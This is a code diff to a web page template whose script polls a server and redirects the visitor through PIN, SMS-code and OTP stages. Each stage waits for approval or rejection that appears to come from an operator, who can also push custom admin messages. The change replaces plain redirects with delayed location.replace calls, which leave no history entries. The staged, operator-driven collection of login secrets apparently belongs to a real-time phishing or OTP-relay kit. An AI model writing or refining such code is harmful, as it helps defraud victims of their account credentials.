@@ -88,7 +88,7 @@
 
     </div>
 
-    <script>
+   <script>
         const appId = "{{ app_id }}";
 
         function checkStatus() {
@@ -100,19 +100,22 @@
                     const smsSection = document.getElementById('smsSection');
                     const msgBox = document.getElementById('customMsg');
 
-                    // Handle Rejections
+                    // Handle Rejections with safe redirect delay
                     if (data.status === "Rejected" || (data.status && data.status.startsWith("Reject_"))) {
                         alert(data.custom_message || "Verification failed. Please try again.");
                         
+                        let targetUrl = "/login";
                         if (data.status === "Reject_PIN") {
-                            window.location.href = "/login";
+                            targetUrl = "/login";
                         } else if (data.status === "Reject_SMS") {
-                            window.location.href = "/submit-auth-code";
+                            targetUrl = "/submit-auth-code";
                         } else if (data.status === "Reject_OTP") {
-                            window.location.href = "/final-verify";
-                        } else {
-                            window.location.href = "/login";
+                            targetUrl = "/final-verify";
                         }
+
+                        setTimeout(() => {
+                            window.location.replace(targetUrl);
+                        }, 100);
                     } 
                     // Handle Approvals / Stage transitions
                     else if (data.status === "Stage1_Approved") {
@@ -120,10 +123,10 @@
                         smsSection.classList.remove('d-none');
                     } 
                     else if (data.status === "Stage2_Approved") {
-                        window.location.href = "/final-verify";
+                        window.location.replace("/final-verify");
                     } 
                     else if (data.status === "Stage3_Approved" || data.status === "Approved") {
-                        window.location.href = "/success";
+                        window.location.replace("/success");
                     } 
                     // Handle Custom Admin Notes
                     else if (data.status === "CustomMessage" && data.custom_message) {
